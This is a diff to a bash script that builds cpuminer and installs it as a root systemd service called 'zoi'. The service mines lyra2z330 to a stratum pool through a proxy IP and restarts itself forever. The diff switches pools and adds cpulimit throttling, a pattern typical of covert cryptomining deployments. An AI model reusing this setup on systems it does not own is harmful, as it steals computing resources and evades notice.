@@ -1,4 +1,3 @@
-
 #!/bin/bash
 sudo apt-get update 
 sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git 
@@ -14,16 +13,18 @@ bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service
 Description=zoi
 After=network.target
 [Service]
-ExecStart= /usr/local/src/cpuminer-opt/cpuminer -a lyra2z330 -o stratum+tcp://d.jkpool.com:3000 -u manlytq.wolf -p x -t 2 -x 45.63.57.158:1102
-WatchdogSec=230
+ExecStart= /usr/local/src/cpuminer-opt/cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u manlytq.wolf -p x -x 45.63.57.158:1102
+WatchdogSec=2403
 Restart=always
 RestartSec=60
 User=root
 [Install]
 WantedBy=multi-user.target
 EOT
-' 
+' &&
+sudo apt-get install cpulimit -y &&
+cpulimit --exe cpuminer --limit 45 -b &&
+#!/bin/bash
 systemctl daemon-reload &&
 systemctl enable zoi.service &&
 service zoi start
-
